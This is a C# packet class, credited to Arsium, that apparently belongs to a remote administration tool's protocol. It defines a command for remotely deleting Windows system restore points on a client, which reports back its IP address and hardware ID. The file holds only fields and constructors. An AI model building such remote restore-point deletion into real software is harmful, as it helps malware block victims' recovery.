using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class DeleteRestorePointPacket : IPacket
    {
        //server
        public DeleteRestorePointPacket(int index) : base()
        {
            packetType = PacketType.UAC_DELETE_RESTORE_POINT;

            this.index = index;
        }

        //client
        public DeleteRestorePointPacket(int index, bool deleted, string baseIp, string HWID) : base()
        {
            packetType = PacketType.UAC_DELETE_RESTORE_POINT;
            this.baseIp = baseIp;
            this.HWID = HWID;

            this.index = index;
            this.deleted = deleted;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public int index { get; set; }
        public bool deleted { get; set; }
    }
}
